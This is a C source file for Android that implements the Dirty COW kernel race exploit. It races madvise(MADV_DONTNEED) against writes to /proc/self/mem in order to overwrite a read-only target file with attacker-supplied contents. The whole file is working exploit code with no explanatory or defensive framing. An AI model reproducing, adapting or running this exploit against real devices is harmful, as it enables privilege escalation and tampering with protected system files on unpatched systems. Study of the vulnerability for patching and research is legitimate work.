#include <err.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <limits.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <android/log.h>

#include "shared.h"


#define LOOP   0x100000

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

struct mem_arg  {
	unsigned char *offset;
	unsigned char *patch;
	size_t patch_size;
};

static void *madviseThread(void *arg)
{
	struct mem_arg *mem_arg;
	size_t size;
	void *addr;
	int i, c = 0;

	mem_arg = (struct mem_arg *)arg;
	/*addr = (void *)((off_t)mem_arg->offset & (~(PAGE_SIZE - 1)));*/
	/*size = mem_arg->offset - (unsigned long)addr;*/
	/*size = mem_arg->patch_size + (mem_arg->offset - addr);*/
	size = mem_arg->patch_size;
	addr = (void *)(mem_arg->offset);
	
	for(i = 0; i < LOOP; i++) {
		c += madvise(addr, size, MADV_DONTNEED);
	}

	return 0;
}

static void *procselfmemThread(void *arg)
{
	struct mem_arg *mem_arg;
	int fd, i, c = 0;
	unsigned char *p;

	mem_arg = (struct mem_arg *)arg;
	p = mem_arg->patch;

	fd = open("/proc/self/mem", O_RDWR);
	if (fd == -1)
		LOGN("open(\"/proc/self/mem\"");

	for (i = 0; i < LOOP; i++) {
		lseek(fd, (off_t)mem_arg->offset, SEEK_SET);
		c += write(fd, p, mem_arg->patch_size);
	}

	close(fd);

	return NULL;
}

int dirtycow(const char *dst, const char *src) {

	struct mem_arg mem_arg;
	struct stat st;
	struct stat st2;

	int f=open(dst,O_RDONLY);
	if (f == -1) {
		LOGV("ERROR: could not open %s", dst);
		return -1;
	}
	if (fstat(f,&st) == -1) {
		LOGV("ERROR: could not open %s", dst);
		return -1;
	}

	int f2=open(src,O_RDONLY);
	if (f2 == -1) {
		LOGV("ERROR: could not open %s", src);
		return -1;
	}
	if (fstat(f2,&st2) == -1) {
		LOGV("ERROR: could not open %s", src);
		return -1;
	}

	size_t size = st.st_size;
	if (st2.st_size != st.st_size) {
		if (st2.st_size > size) {
			size = st2.st_size;
		}
	}

	mem_arg.patch = malloc(size);
	if (mem_arg.patch == NULL)
		LOGN("malloc");

	memset(mem_arg.patch, 0, size);

	read(f2, mem_arg.patch, st2.st_size);
	close(f2);

	mem_arg.patch_size = size;

	void * map = mmap(NULL, size, PROT_READ, MAP_PRIVATE, f, 0);
	if (map == MAP_FAILED) {
		LOGN("mmap");
		return -1;
	}

	mem_arg.offset = map;

	// run the exploit
	pthread_t pth1, pth2;

	//LOGV("[*] dirtycow overwriting %s with %s", dst, src);
	pthread_create(&pth1, NULL, madviseThread, &mem_arg);
	pthread_create(&pth2, NULL, procselfmemThread, &mem_arg);

	pthread_join(pth1, NULL);
	pthread_join(pth2, NULL);

	close(f);

	//LOGV("[*] dirtycow complete");
	return 0;
}
